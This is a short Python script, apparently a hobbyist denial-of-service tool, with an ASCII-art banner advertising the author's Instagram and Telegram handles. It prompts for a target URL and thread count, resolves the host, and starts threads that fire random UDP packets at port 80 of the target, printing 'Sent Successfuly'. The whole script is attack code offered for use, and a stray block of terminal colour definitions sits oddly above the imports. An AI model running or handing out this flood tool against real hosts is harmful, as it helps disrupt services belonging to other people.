# Bold
BBlack="\033[1;30m"       # Black
BRed="\033[1;31m"         # Red
BGreen="\033[1;32m"       # Green
BYellow="\033[1;33m"      # Yellow
BBlue="\033[1;34m"        # Blue
BPurple="\033[1;35m"      # Purple
BCyan="\033[1;36m"        # Cyan
BWhite="\033[1;37m"       # White
import socket
import threading
import random
print('''
      NO!                          NO!
     MNO!!         [FX]           MNNO!!
   MMNO!        MMMMMMMPPP       MNNOO!!
 MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!!
 !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO!
       ! MMMMMMMMMMMMMPPPPOOOOIII! !
        MMMMMMMMMMMMPPPPPOOOOOOII!!
        MMMMMOOOOOOPPPPPPPPOOOOMII!
        MMMMM     OPPMMP      OMI!
        MMMM       OPMPP       I!!
          NNM,,,,,,OOPM!,,,,,,!!!!
         MMNNNNNOOOOPMO!!IIPPO!!O!
         MMMMMNNNNOO:!!:!!IPPPPOO!
          MMMMMNNOOMMNNIIIPPPOO!!
             MMMONNMMNNNIIIOO!
           MN MOMMMNNNIIIIIO! OO
          MNO! IiiiiiiiiiiiI OOOO
     NNN.MNO!   O!!!!!!!!!O   OONO NO!
    MNNNNNO!    OOOOOOOOOOO    MMNNON!
      MNNNNO!    PPPPPPPPP    MMNON!
         OO!                   ON!
         
           INSTAGRAM : FX_PY3
           TELEGRAM : TVVNU
''')
def create_rnd_msg(msg_size):
	rnd_msg = ""
	for i in range(0, msg_size):
		ch_rnd = random.randint(0, 255)
		rnd_msg += chr(ch_rnd)
	return rnd_msg
site = input("[+] - Target URL => ")
if 'https://'in site:
	site=site.split('https://')[1]
if '/'in site :
	site=site.split('/')[0]
thread_count = int(input("[+] - threads => "))
ip = socket.gethostbyname(site)
UDP_PORT=80
print('\n'*2)
print("[-] - protocol : UDP")
print("[-] - target ip : ", ip )
print("[-] - target port : ", UDP_PORT)

print('\n'*2)
print('_'*9)
i=0
def dos():
		MESSAGE = str.encode(create_rnd_msg(8))
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(MESSAGE, (ip, UDP_PORT))
		print(f'\rSent Successfuly =>  {i}',end='')	
thread_count=thread_count+1
for i in range(thread_count):
	try:
		threading.Thread(target=dos).start()	
	except KeyboardInterrupt:
		exit()
